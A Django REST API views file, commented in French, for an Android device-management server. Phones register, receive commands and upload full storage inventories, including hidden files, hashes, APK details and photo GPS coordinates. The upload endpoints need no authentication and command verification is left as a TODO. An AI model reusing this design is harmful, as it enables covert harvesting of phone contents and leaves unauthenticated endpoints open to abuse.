# api/views.py
from rest_framework import viewsets, status, generics
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework.permissions import AllowAny, IsAdminUser
from django.utils import timezone
from django.db.models import Count, Sum, Q
from django.shortcuts import get_object_or_404
from .models import Device, FileList, FileItem, FileScanStats
from .serializers import (
    # Serializers existants
    DeviceRegistrationSerializer, 
    DeviceDetailSerializer, 
    DeviceHeartbeatSerializer,
    DeviceListSerializer,
    ServerCommandSerializer,
    CommandResponseSerializer,
    PendingCommandsSerializer,
    ServerKeyRegenerateSerializer,
    
    # Nouveaux serializers pour les fichiers
    FileItemSerializer,
    FileListSerializer,
    FileListDetailSerializer,
    FileUploadSerializer,
    FileScanStatsSerializer,
    FileSearchSerializer,
    ListFilesCommandSerializer,
    DeviceWithFilesSerializer,
    FileTypeSummarySerializer,
    StorageSummarySerializer,
)

import uuid
from datetime import timedelta
import json


class DeviceViewSet(viewsets.ModelViewSet):
    """
    ViewSet pour gérer les appareils Android
    """
    queryset = Device.objects.all()
    
    def get_permissions(self):
        """
        Définit les permissions selon l'action
        - PUBLIC (téléphone → serveur) : register, heartbeat, upload_file_list
        - ADMIN (serveur → téléphone) : send_command, pending_commands, request_file_list
        - ADMIN (gestion) : tout le reste
        """
        if self.action in ['register', 'heartbeat', 'upload_file_list']:
            # Actions du téléphone vers le serveur (publiques)
            permission_classes = [AllowAny]
        elif self.action in ['send_command', 'pending_commands', 'regenerate_server_key', 
                            'request_file_list', 'file_scans', 'file_scan_detail', 
                            'file_stats', 'search_files']:
            # Actions du serveur vers le téléphone (admin seulement)
            permission_classes = [IsAdminUser]
        else:
            # Actions d'administration classiques
            permission_classes = [IsAdminUser]
        
        return [permission() for permission in permission_classes]
    
    def get_serializer_class(self):
        """
        Retourne le serializer approprié selon l'action
        """
        # Actions existantes
        if self.action == 'register':
            return DeviceRegistrationSerializer
        elif self.action == 'heartbeat':
            return DeviceHeartbeatSerializer
        elif self.action == 'send_command':
            return ServerCommandSerializer
        elif self.action == 'list':
            return DeviceListSerializer
        elif self.action == 'retrieve':
            return DeviceDetailSerializer
        elif self.action in ['update', 'partial_update']:
            return DeviceRegistrationSerializer
        
        # Nouvelles actions pour les fichiers
        elif self.action == 'upload_file_list':
            return FileUploadSerializer
        elif self.action == 'request_file_list':
            return ListFilesCommandSerializer
        elif self.action == 'file_scans':
            return FileListSerializer
        elif self.action == 'file_scan_detail':
            return FileListDetailSerializer
        elif self.action == 'file_stats':
            return FileScanStatsSerializer
        elif self.action == 'search_files':
            return FileSearchSerializer
        
        return DeviceDetailSerializer
    
    def get_queryset(self):
        """
        Filtre les querysets si nécessaire
        """
        queryset = Device.objects.all()
        
        # Filtre par statut actif
        is_active = self.request.query_params.get('is_active', None)
        if is_active is not None:
            is_active = is_active.lower() == 'true'
            queryset = queryset.filter(is_active=is_active)
        
        # Filtre par fabricant
        manufacturer = self.request.query_params.get('manufacturer', None)
        if manufacturer:
            queryset = queryset.filter(manufacturer__icontains=manufacturer)
        
        # Filtre par version Android
        android_version = self.request.query_params.get('android_version', None)
        if android_version:
            queryset = queryset.filter(android_version__icontains=android_version)
        
        # Filtre par modèle
        model = self.request.query_params.get('model', None)
        if model:
            queryset = queryset.filter(model__icontains=model)
        
        # Filtre par date (dernières 24h)
        last_24h = self.request.query_params.get('last_24h', None)
        if last_24h and last_24h.lower() == 'true':
            queryset = queryset.filter(last_seen__gte=timezone.now() - timedelta(hours=24))
        
        return queryset.order_by('-last_seen')
    
    # ===== 1. ACTIONS DU TÉLÉPHONE VERS LE SERVEUR (PUBLIQUES) =====
    
    @action(detail=False, methods=['post'], permission_classes=[AllowAny])
    def register(self, request):
        """
        Endpoint PUBLIC pour l'enregistrement initial d'un appareil
        POST /api/devices/register/
        """
        android_id = request.data.get('androidId')
        
        if not android_id:
            return Response({
                'error': 'androidId est requis'
            }, status=status.HTTP_400_BAD_REQUEST)
        
        try:
            device = Device.objects.get(android_id=android_id)
            serializer = self.get_serializer(device, data=request.data, partial=True)
            serializer.is_valid(raise_exception=True)
            self.perform_update(serializer)
            device.refresh_from_db()
            
            return Response({
                'status': 'updated',
                'message': 'Appareil mis à jour avec succès',
                'device_id': device.id,
                'server_key': device.device_key,
                'instructions': 'Cette clé sera utilisée par le SERVEUR pour vous contacter. Stockez-la pour vérifier l\'identité du serveur.'
            }, status=status.HTTP_200_OK)
            
        except Device.DoesNotExist:
            serializer = self.get_serializer(data=request.data)
            serializer.is_valid(raise_exception=True)
            device = serializer.save()
            
            return Response({
                'status': 'registered',
                'message': 'Appareil enregistré avec succès',
                'device_id': device.id,
                'server_key': device.device_key,
                'instructions': 'Cette clé sera utilisée par le SERVEUR pour vous contacter. Stockez-la pour vérifier l\'identité du serveur.'
            }, status=status.HTTP_201_CREATED)
    
    @action(detail=False, methods=['post'], permission_classes=[AllowAny])
    def heartbeat(self, request):
        """
        Endpoint PUBLIC pour les mises à jour périodiques
        POST /api/devices/heartbeat/
        """
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        android_id = serializer.validated_data.get('androidId')
        
        try:
            device = Device.objects.get(android_id=android_id)
            
            device.last_seen = timezone.now()
            device.is_active = True
            
            if 'battery_level' in serializer.validated_data:
                device.battery_level = serializer.validated_data['battery_level']
            if 'is_charging' in serializer.validated_data:
                device.is_charging = serializer.validated_data['is_charging']
            if 'available_storage' in serializer.validated_data:
                device.available_storage = serializer.validated_data['available_storage']
            if 'network_type' in serializer.validated_data:
                device.network_type = serializer.validated_data['network_type']
            if 'is_roaming' in serializer.validated_data:
                device.is_roaming = serializer.validated_data['is_roaming']
            
            device.save()
            
            return Response({
                'status': 'ok',
                'message': 'Heartbeat reçu',
                'timestamp': timezone.now()
            }, status=status.HTTP_200_OK)
            
        except Device.DoesNotExist:
            return Response({
                'error': 'Appareil non trouvé. Veuillez d\'abord enregistrer l\'appareil.'
            }, status=status.HTTP_404_NOT_FOUND)
    
    # ===== 2. NOUVEL ENDPOINT : UPLOAD DE LA LISTE DES FICHIERS =====
    
    @action(detail=False, methods=['post'], permission_classes=[AllowAny])
    def upload_file_list(self, request):
        """
        Endpoint PUBLIC pour que le téléphone envoie sa liste de fichiers
        POST /api/devices/upload_file_list/
        
        Le téléphone appelle cet endpoint après avoir reçu la commande 'list_files'
        et scanné son stockage.
        """
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        data = serializer.validated_data
        android_id = data.get('androidId')
        scan_id = data.get('scan_id')
        
        # Récupérer l'appareil
        try:
            device = Device.objects.get(android_id=android_id)
        except Device.DoesNotExist:
            return Response({
                'error': 'Appareil non trouvé'
            }, status=status.HTTP_404_NOT_FOUND)
        
        # Vérifier si le scan existe déjà
        file_list, created = FileList.objects.update_or_create(
            scan_id=scan_id,
            defaults={
                'device': device,
                'scan_requested_at': timezone.now(),
                'scan_started_at': timezone.datetime.fromtimestamp(
                    data.get('scan_started_at') / 1000,
                    tz=timezone.get_current_timezone()
                ) if data.get('scan_started_at') else None,
                'scan_completed_at': timezone.datetime.fromtimestamp(
                    data.get('scan_completed_at') / 1000,
                    tz=timezone.get_current_timezone()
                ) if data.get('scan_completed_at') else None,
                'scan_duration_ms': data.get('scan_duration_ms'),
                'total_files': data.get('total_files'),
                'total_size_bytes': data.get('total_size_bytes'),
                'command_id': data.get('command_id', ''),
                'status': data.get('status'),
                'error_message': data.get('error_message', ''),
            }
        )
        
        if not created:
            # Si le scan existe déjà, on supprime les anciens fichiers
            file_list.files.all().delete()
        
        # Insérer les fichiers par lots pour optimiser les performances
        files_to_create = []
        for file_data in data.get('files', []):
            # Convertir les timestamps si nécessaire
            files_to_create.append(FileItem(
                file_list=file_list,
                path=file_data.get('path'),
                parent_path=file_data.get('parent_path', ''),
                name=file_data.get('name'),
                extension=file_data.get('extension', ''),
                size_bytes=file_data.get('size_bytes', 0),
                last_modified=file_data.get('last_modified'),
                last_accessed=file_data.get('last_accessed'),
                created_at_time=file_data.get('created_at_time'),
                file_type=file_data.get('file_type', 'other'),
                mime_type=file_data.get('mime_type', ''),
                is_readable=file_data.get('is_readable', True),
                is_writable=file_data.get('is_writable', False),
                is_hidden=file_data.get('is_hidden', False),
                is_directory=file_data.get('is_directory', False),
                md5_hash=file_data.get('md5_hash', ''),
                sha1_hash=file_data.get('sha1_hash', ''),
                media_width=file_data.get('media_width'),
                media_height=file_data.get('media_height'),
                media_duration_ms=file_data.get('media_duration_ms'),
                media_date_taken=file_data.get('media_date_taken'),
                media_gps_lat=file_data.get('media_gps_lat'),
                media_gps_lng=file_data.get('media_gps_lng'),
                apk_package_name=file_data.get('apk_package_name', ''),
                apk_version_code=file_data.get('apk_version_code'),
                apk_version_name=file_data.get('apk_version_name', ''),
                apk_min_sdk=file_data.get('apk_min_sdk'),
            ))
        
        # Insertion en masse (beaucoup plus rapide)
        if files_to_create:
            FileItem.objects.bulk_create(files_to_create, batch_size=1000)
        
        # Mettre à jour le compteur réel
        actual_count = file_list.files.count()
        if actual_count != data.get('total_files'):
            file_list.total_files = actual_count
            file_list.save(update_fields=['total_files'])
        
        # Générer les statistiques agrégées
        try:
            FileScanStats.objects.filter(file_list=file_list).delete()
            FileScanStats.generate_from_file_list(file_list)
        except Exception as e:
            # Log l'erreur mais ne pas faire échouer la requête
            print(f"Erreur génération stats: {e}")
        
        return Response({
            'status': 'success',
            'message': f'Liste de fichiers reçue avec {actual_count} fichiers',
            'scan_id': scan_id,
            'device_id': device.id,
            'files_stored': actual_count,
            'total_size_bytes': file_list.total_size_bytes,
            'total_size_mb': round(file_list.total_size_bytes / (1024 * 1024), 2),
            'total_size_gb': round(file_list.total_size_bytes / (1024 ** 3), 2)
        }, status=status.HTTP_201_CREATED)
    
    # ===== 3. ACTIONS DU SERVEUR VERS LE TÉLÉPHONE (ADMIN SEULEMENT) =====
    
    @action(detail=True, methods=['post'], permission_classes=[IsAdminUser])
    def send_command(self, request, pk=None):
        """
        Endpoint ADMIN pour envoyer une commande à un téléphone spécifique
        POST /api/devices/{id}/send_command/
        """
        device = self.get_object()
        
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        command = serializer.validated_data.get('command')
        params = serializer.validated_data.get('params', {})
        priority = serializer.validated_data.get('priority', 'normal')
        expires_in = serializer.validated_data.get('expires_in')
        
        command_id = f"cmd_{device.id}_{int(timezone.now().timestamp())}"
        
        return Response({
            'status': 'command_queued',
            'message': f'Commande {command} mise en file d\'attente',
            'command_id': command_id,
            'device': {
                'id': device.id,
                'android_id': device.android_id,
                'model': device.model,
            },
            'command': command,
            'params': params,
            'priority': priority,
            'expires_in': expires_in,
            'queued_at': timezone.now(),
            'verification_required': True,
            'verification_method': 'Le téléphone doit vérifier que l\'expéditeur possède la server_key',
            'server_key_for_verification': device.device_key
        }, status=status.HTTP_202_ACCEPTED)
    
    @action(detail=True, methods=['post'], permission_classes=[IsAdminUser])
    def request_file_list(self, request, pk=None):
        """
        Endpoint ADMIN pour demander la liste des fichiers d'un appareil
        POST /api/devices/{id}/request_file_list/
        
        Le serveur envoie une commande au téléphone pour qu'il scanne ses fichiers.
        """
        device = self.get_object()
        
        # Vérifier que l'appareil est actif
        if not device.is_active:
            return Response({
                'error': 'Cet appareil est inactif. Impossible d\'envoyer une commande.'
            }, status=status.HTTP_400_BAD_REQUEST)
        
        # Valider les paramètres
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        scan_params = serializer.validated_data
        
        # Créer un scan_id unique
        scan_id = f"scan_{device.id}_{timezone.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
        
        # Créer l'entrée FileList en attente
        file_list = FileList.objects.create(
            device=device,
            scan_id=scan_id,
            scan_requested_at=timezone.now(),
            status='pending',
            command_id=f"cmd_{device.id}_{int(timezone.now().timestamp())}"
        )
        
        # Préparer la commande pour le téléphone
        command_data = {
            'command': 'list_files',
            'params': {
                'scan_id': scan_id,
                **scan_params
            },
            'priority': request.data.get('priority', 'normal'),
            'expires_in': request.data.get('expires_in', 3600),
            'require_ack': True
        }
        
        # Valider la commande
        command_serializer = ServerCommandSerializer(data=command_data)
        command_serializer.is_valid(raise_exception=True)
        
        # Mettre à jour le statut
        file_list.status = 'scanning'
        file_list.save()
        
        # TODO: Ici, vous enverriez réellement la commande au téléphone via votre système de push
        
        return Response({
            'status': 'command_sent',
            'message': f'Demande de liste de fichiers envoyée à {device.model}',
            'device': {
                'id': device.id,
                'android_id': device.android_id,
                'model': device.model,
                'manufacturer': device.manufacturer,
                'device_key': device.device_key
            },
            'scan': {
                'id': file_list.id,
                'scan_id': scan_id,
                'status': file_list.status,
                'requested_at': file_list.scan_requested_at
            },
            'command': command_data,
            'instructions': {
                'telephone': 'Le téléphone doit scanner ses fichiers et appeler POST /api/devices/upload_file_list/',
                'endpoint_upload': '/api/devices/upload_file_list/',
                'verification': 'Inclure la device_key dans l\'en-tête X-Device-Key'
            }
        }, status=status.HTTP_202_ACCEPTED)
    
    @action(detail=True, methods=['get'], permission_classes=[IsAdminUser])
    def pending_commands(self, request, pk=None):
        """
        Endpoint ADMIN pour voir les commandes en attente pour un téléphone
        GET /api/devices/{id}/pending_commands/
        """
        device = self.get_object()
        
        # TODO: Implémenter la file d'attente réelle
        pending_commands = []
        
        return Response({
            'device_id': device.id,
            'device_android_id': device.android_id,
            'device_model': device.model,
            'pending_commands_count': len(pending_commands),
            'pending_commands': pending_commands,
            'verification_required': 'Le téléphone doit vérifier la signature du serveur',
            'server_key_for_verification': device.device_key
        })
    
    @action(detail=True, methods=['post'], permission_classes=[IsAdminUser])
    def regenerate_server_key(self, request, pk=None):
        """
        Régénérer la clé serveur pour un appareil (en cas de compromission)
        POST /api/devices/{id}/regenerate_server_key/
        """
        device = self.get_object()
        old_key = device.device_key
        device.device_key = device.generate_key()
        device.save()
        
        return Response({
            'status': 'key_regenerated',
            'message': 'Clé serveur régénérée. La nouvelle clé doit être communiquée au téléphone.',
            'device_id': device.id,
            'android_id': device.android_id,
            'old_key': old_key[:10] + '...',
            'new_server_key': device.device_key,
            'old_key_invalidated': True,
            'instructions': 'Communiquez cette nouvelle clé au téléphone pour qu\'il mette à jour sa vérification.'
        }, status=status.HTTP_200_OK)
    
    # ===== 4. NOUVEAUX ENDPOINTS DE CONSULTATION DES FICHIERS =====
    
    @action(detail=True, methods=['get'], permission_classes=[IsAdminUser])
    def file_scans(self, request, pk=None):
        """
        Liste tous les scans de fichiers pour un appareil
        GET /api/devices/{id}/file_scans/
        """
        device = self.get_object()
        
        # Pagination
        limit = int(request.query_params.get('limit', 20))
        offset = int(request.query_params.get('offset', 0))
        
        scans = device.file_lists.all().order_by('-created_at')[offset:offset+limit]
        
        serializer = FileListSerializer(scans, many=True)
        
        return Response({
            'device_id': device.id,
            'android_id': device.android_id,
            'device_name': f"{device.manufacturer} {device.model}",
            'total_scans': device.file_lists.count(),
            'returned_scans': len(scans),
            'offset': offset,
            'limit': limit,
            'scans': serializer.data
        })
    
    @action(detail=True, methods=['get'], permission_classes=[IsAdminUser])
    def file_scan_detail(self, request, pk=None):
        """
        Détail d'un scan spécifique
        GET /api/devices/{id}/file_scan_detail/?scan_id=XXX
        """
        device = self.get_object()
        scan_id = request.query_params.get('scan_id')
        
        if not scan_id:
            return Response({
                'error': 'scan_id requis'
            }, status=status.HTTP_400_BAD_REQUEST)
        
        try:
            file_list = device.file_lists.get(scan_id=scan_id)
        except FileList.DoesNotExist:
            return Response({
                'error': 'Scan non trouvé'
            }, status=status.HTTP_404_NOT_FOUND)
        
        serializer = FileListDetailSerializer(file_list)
        
        return Response(serializer.data)
    
    @action(detail=True, methods=['get'], permission_classes=[IsAdminUser])
    def file_stats(self, request, pk=None):
        """
        Statistiques détaillées des fichiers pour un appareil (dernier scan)
        GET /api/devices/{id}/file_stats/
        """
        device = self.get_object()
        scan_id = request.query_params.get('scan_id')
        
        if scan_id:
            # Stats pour un scan spécifique
            try:
                file_list = device.file_lists.get(scan_id=scan_id)
            except FileList.DoesNotExist:
                return Response({
                    'error': 'Scan non trouvé'
                }, status=status.HTTP_404_NOT_FOUND)
        else:
            # Dernier scan complété
            file_list = device.file_lists.filter(status='completed').first()
            if not file_list:
                return Response({
                    'error': 'Aucun scan disponible pour cet appareil'
                }, status=status.HTTP_404_NOT_FOUND)
        
        # Stats par type
        type_stats = file_list.files.values('file_type').annotate(
            count=Count('id'),
            total_size=Sum('size_bytes')
        ).order_by('file_type')
        
        # Top 20 plus gros fichiers
        largest_files = file_list.files.order_by('-size_bytes')[:20].values(
            'id', 'name', 'path', 'size_bytes', 'file_type', 'extension'
        )
        
        # Stats par extension
        extension_stats = file_list.files.values('extension').annotate(
            count=Count('id')
        ).order_by('-count')[:30]
        
        # Stats par dossier (premier niveau)
        folder_stats = file_list.files.values('parent_path').annotate(
            count=Count('id'),
            total_size=Sum('size_bytes')
        ).order_by('-total_size')[:20]
        
        return Response({
            'device_id': device.id,
            'android_id': device.android_id,
            'device_name': f"{device.manufacturer} {device.model}",
            'scan': {
                'id': file_list.id,
                'scan_id': file_list.scan_id,
                'date': file_list.scan_completed_at,
                'total_files': file_list.total_files,
                'total_size_bytes': file_list.total_size_bytes,
                'total_size_mb': round(file_list.total_size_bytes / (1024 * 1024), 2),
                'total_size_gb': round(file_list.total_size_bytes / (1024 ** 3), 2)
            },
            'stats_by_type': [
                {
                    'file_type': item['file_type'],
                    'count': item['count'],
                    'total_size_bytes': item['total_size'],
                    'total_size_mb': round(item['total_size'] / (1024 * 1024), 2) if item['total_size'] else 0,
                    'total_size_gb': round(item['total_size'] / (1024 ** 3), 2) if item['total_size'] else 0,
                    'percentage': round(item['count'] / file_list.total_files * 100, 2) if file_list.total_files else 0
                }
                for item in type_stats
            ],
            'largest_files': [
                {
                    **file,
                    'size_mb': round(file['size_bytes'] / (1024 * 1024), 2),
                    'size_gb': round(file['size_bytes'] / (1024 ** 3), 2)
                }
                for file in largest_files
            ],
            'top_extensions': [
                {
                    'extension': item['extension'] or 'sans extension',
                    'count': item['count']
                }
                for item in extension_stats if item['extension']
            ],
            'top_folders': [
                {
                    'path': item['parent_path'] or '/',
                    'count': item['count'],
                    'total_size_mb': round(item['total_size'] / (1024 * 1024), 2) if item['total_size'] else 0
                }
                for item in folder_stats if item['parent_path']
            ],
            'hidden_files_count': file_list.files.filter(is_hidden=True).count(),
            'directories_count': file_list.files.filter(is_directory=True).count(),
        })
    
    @action(detail=False, methods=['get'], permission_classes=[IsAdminUser])
    def search_files(self, request):
        """
        Recherche avancée de fichiers sur tous les appareils
        GET /api/devices/search_files/
        """
        serializer = FileSearchSerializer(data=request.query_params)
        serializer.is_valid(raise_exception=True)
        
        params = serializer.validated_data
        query = params.get('query', '')
        file_type = params.get('file_type')
        min_size = params.get('min_size')
        max_size = params.get('max_size')
        extension = params.get('extension')
        device_id = params.get('device_id')
        hidden_only = params.get('hidden_only', False)
        limit = params.get('limit', 100)
        
        # Commencer par les scans les plus récents uniquement
        latest_scans = FileList.objects.filter(status='completed').order_by('-created_at')
        
        if device_id:
            latest_scans = latest_scans.filter(device_id=device_id)
        
        latest_scans_ids = [scan.id for scan in latest_scans[:50]]  # 50 scans récents
        
        # Construire la requête
        files = FileItem.objects.filter(file_list_id__in=latest_scans_ids)
        
        if query:
            files = files.filter(
                Q(name__icontains=query) | 
                Q(path__icontains=query)
            )
        
        if file_type and file_type != 'all':
            files = files.filter(file_type=file_type)
        
        if extension:
            files = files.filter(extension__iexact=extension)
        
        if min_size:
            files = files.filter(size_bytes__gte=min_size)
        
        if max_size:
            files = files.filter(size_bytes__lte=max_size)
        
        if hidden_only:
            files = files.filter(is_hidden=True)
        
        # Exclure les dossiers par défaut
        files = files.filter(is_directory=False)
        
        # Limiter et optimiser
        files = files.select_related('file_list__device').order_by('-size_bytes')[:limit]
        
        results = []
        for file in files:
            results.append({
                'id': file.id,
                'name': file.name,
                'path': file.path,
                'size_bytes': file.size_bytes,
                'size_mb': round(file.size_bytes / (1024 * 1024), 2),
                'size_formatted': file.size_formatted,
                'file_type': file.file_type,
                'extension': file.extension,
                'is_hidden': file.is_hidden,
                'device': {
                    'id': file.file_list.device.id,
                    'android_id': file.file_list.device.android_id,
                    'model': file.file_list.device.model,
                    'manufacturer': file.file_list.device.manufacturer,
                },
                'scan': {
                    'id': file.file_list.id,
                    'scan_id': file.file_list.scan_id,
                    'date': file.file_list.scan_completed_at,
                },
                'media': {
                    'width': file.media_width,
                    'height': file.media_height,
                    'duration_ms': file.media_duration_ms,
                } if file.file_type in ['image', 'video', 'audio'] else None
            })
        
        return Response({
            'query': query,
            'filters': params,
            'total_results': len(results),
            'results': results
        })
    
    # ===== 5. ACTIONS ADMIN CLASSIQUES (GESTION DES APPAREILS) =====
    
    @action(detail=False, methods=['get'])
    def active(self, request):
        """
        Liste tous les appareils actifs
        GET /api/devices/active/
        """
        active_devices = Device.objects.filter(is_active=True)
        serializer = DeviceListSerializer(active_devices, many=True)
        return Response({
            'count': active_devices.count(),
            'devices': serializer.data
        })
    
    @action(detail=False, methods=['get'])
    def stats(self, request):
        """
        Statistiques générales incluant les fichiers
        GET /api/devices/stats/
        """
        # Stats de base
        total = Device.objects.count()
        active = Device.objects.filter(is_active=True).count()
        inactive = total - active
        
        # Stats des fichiers
        total_scans = FileList.objects.count()
        completed_scans = FileList.objects.filter(status='completed').count()
        
        total_files_stored = FileItem.objects.filter(is_directory=False).count()
        total_size_stored = FileItem.objects.filter(is_directory=False).aggregate(
            total=Sum('size_bytes')
        )['total'] or 0
        
        # Stats par type de fichier
        files_by_type = FileItem.objects.filter(is_directory=False).values('file_type').annotate(
            count=Count('id'),
            total_size=Sum('size_bytes')
        ).order_by('-count')
        
        # Top fabricants
        top_manufacturers = Device.objects.values('manufacturer')\
            .exclude(manufacturer='')\
            .annotate(count=Count('manufacturer'))\
            .order_by('-count')[:5]
        
        # Appareils avec le plus de fichiers
        top_devices_files = Device.objects.annotate(
            file_count=Count('file_lists__files', filter=Q(file_lists__files__is_directory=False))
        ).order_by('-file_count')[:5]
        
        return Response({
            'devices': {
                'total': total,
                'active': active,
                'inactive': inactive,
                'seen_today': Device.objects.filter(last_seen__date=timezone.now().date()).count(),
                'seen_week': Device.objects.filter(last_seen__gte=timezone.now() - timedelta(days=7)).count(),
                'rooted': Device.objects.filter(is_rooted_score__gt=0.5).count(),
                'emulators': Device.objects.filter(is_emulator=True).count(),
            },
            'files': {
                'total_scans': total_scans,
                'completed_scans': completed_scans,
                'total_files': total_files_stored,
                'total_size_bytes': total_size_stored,
                'total_size_gb': round(total_size_stored / (1024 ** 3), 2),
                'files_by_type': [
                    {
                        'type': item['file_type'],
                        'count': item['count'],
                        'size_gb': round(item['total_size'] / (1024 ** 3), 2) if item['total_size'] else 0
                    }
                    for item in files_by_type
                ],
            },
            'top_manufacturers': list(top_manufacturers),
            'top_devices_by_files': [
                {
                    'id': d.id,
                    'name': f"{d.manufacturer} {d.model}",
                    'android_id': d.android_id[:10] + '...',
                    'file_count': d.file_count
                }
                for d in top_devices_files
            ],
            'timestamp': timezone.now()
        })
    
    @action(detail=True, methods=['post'])
    def deactivate(self, request, pk=None):
        """Désactiver un appareil"""
        device = self.get_object()
        device.is_active = False
        device.save()
        return Response({
            'status': 'deactivated',
            'device_id': device.id,
            'message': 'Appareil désactivé avec succès'
        })
    
    @action(detail=True, methods=['post'])
    def activate(self, request, pk=None):
        """Réactiver un appareil"""
        device = self.get_object()
        device.is_active = True
        device.last_seen = timezone.now()
        device.save()
        return Response({
            'status': 'activated',
            'device_id': device.id,
            'message': 'Appareil réactivé avec succès'
        })
    
    @action(detail=True, methods=['get'])
    def info_complete(self, request, pk=None):
        """Récupère toutes les informations d'un appareil"""
        device = self.get_object()
        serializer = DeviceRegistrationSerializer(device)
        data = serializer.data
        data.update({
            'device_key': device.device_key,
            'created_at': device.created_at,
            'last_seen': device.last_seen,
            'is_active': device.is_active,
            'id': device.id,
            'scans_count': device.file_lists.count(),
            'files_count': FileItem.objects.filter(file_list__device=device, is_directory=False).count()
        })
        return Response(data)
    
    @action(detail=False, methods=['get'])
    def search(self, request):
        """Recherche avancée d'appareils"""
        query = request.query_params.get('q', '')
        if len(query) < 2:
            return Response({
                'error': 'La recherche doit contenir au moins 2 caractères'
            }, status=status.HTTP_400_BAD_REQUEST)
        
        devices = Device.objects.filter(
            Q(android_id__icontains=query) |
            Q(model__icontains=query) |
            Q(manufacturer__icontains=query) |
            Q(brand__icontains=query) |
            Q(device_code__icontains=query)
        )[:20]
        
        serializer = DeviceWithFilesSerializer(devices, many=True)
        return Response({
            'query': query,
            'count': devices.count(),
            'results': serializer.data
        })


# Vue pour la racine de l'API
class APIRootView(generics.GenericAPIView):
    """
    Vue pour la racine de l'API
    """
    permission_classes = [AllowAny]
    
    def get(self, request):
        return Response({
            'name': 'Android Device Management API',
            'version': '2.0',
            'description': 'API bidirectionnelle pour gérer les appareils Android',
            
            'public_endpoints': {
                'register': 'POST /api/devices/register/ - Enregistrer un appareil',
                'heartbeat': 'POST /api/devices/heartbeat/ - Mettre à jour l\'état',
                'upload_file_list': 'POST /api/devices/upload_file_list/ - Upload liste fichiers',
            },
            
            'server_to_device_endpoints': {
                'send_command': 'POST /api/devices/{id}/send_command/ - Envoyer commande',
                'request_file_list': 'POST /api/devices/{id}/request_file_list/ - Demander fichiers',
                'pending_commands': 'GET /api/devices/{id}/pending_commands/ - Commandes en attente',
                'regenerate_key': 'POST /api/devices/{id}/regenerate_server_key/ - Régénérer clé',
            },
            
            'file_management_endpoints': {
                'file_scans': 'GET /api/devices/{id}/file_scans/ - Liste des scans',
                'file_scan_detail': 'GET /api/devices/{id}/file_scan_detail/?scan_id=XXX - Détail scan',
                'file_stats': 'GET /api/devices/{id}/file_stats/ - Statistiques fichiers',
                'search_files': 'GET /api/devices/search_files/?q=xxx - Recherche globale',
            },
            
            'admin_endpoints': {
                'list': 'GET /api/devices/',
                'active': 'GET /api/devices/active/',
                'stats': 'GET /api/devices/stats/',
                'search': 'GET /api/devices/search/?q=texte',
                'detail': 'GET /api/devices/{id}/',
                'update': 'PUT /api/devices/{id}/',
                'delete': 'DELETE /api/devices/{id}/',
                'deactivate': 'POST /api/devices/{id}/deactivate/',
                'activate': 'POST /api/devices/{id}/activate/',
            },
            
            'security_model': {
                'device_to_server': 'Public - Aucune authentification requise',
                'server_to_device': 'Authentification via server_key',
                'admin_interface': 'Authentification session Django',
            },
            
            'documentation': '/api/docs/',
            'admin_interface': '/admin/',
        })